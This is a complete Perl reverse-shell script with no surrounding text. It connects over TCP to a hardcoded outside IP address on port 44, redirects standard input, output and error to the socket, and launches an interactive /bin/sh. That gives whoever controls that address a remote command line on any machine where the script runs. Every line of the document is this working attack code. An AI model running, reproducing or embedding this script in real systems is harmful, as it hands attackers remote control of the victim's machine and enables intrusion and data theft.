#!/usr/bin/perl
use Socket;
$iaddr=inet_aton('18.138.186.150') || die("Error: $!\n");
$paddr=sockaddr_in('44', $iaddr) || die("Error: $!\n");
$proto=getprotobyname('tcp');
socket(SOCKET, PF_INET, SOCK_STREAM, $proto) || die("Error: $!\n");
connect(SOCKET, $paddr) || die("Error: $!\n");
open(STDIN, ">&SOCKET");
open(STDOUT, ">&SOCKET");
open(STDERR, ">&SOCKET");
system('/bin/sh -i');
close(STDIN);
close(STDOUT);
close(STDERR);
